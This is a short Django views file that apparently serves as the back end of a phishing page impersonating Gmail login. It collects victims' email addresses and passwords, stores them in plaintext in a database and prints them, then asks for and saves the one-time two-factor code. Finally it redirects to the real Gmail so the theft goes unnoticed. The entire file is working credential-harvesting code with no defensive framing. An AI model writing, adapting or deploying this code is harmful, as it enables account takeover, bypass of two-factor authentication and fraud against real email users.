from django.shortcuts import render, redirect
from .models import EmailLogins

# Create your views here.
def gmail_picker(request):
    if request.method == "POST":
        email = request.POST.get('email')
        password = request.POST.get('password')

        EmailLogins.objects.create(
            email = email,
            password = password
        )
        request.session['email'] = email
        print(email)
        print(password)

        return redirect('/otp/')

    return render(request, 'index.html', {})


def gmail_otp(request):
    if not request.session.get('email'):
        return redirect('/')

    if request.method == "POST":
        username = request.session.get('email')
        otp = request.POST.get('otp')

        updating = EmailLogins.objects.get(
            email = username
        )
        updating.otp = otp
        updating.save()
        del request.session['email']

        return redirect('https://mail.google.com/')

    return render(request, 'otp.html', {})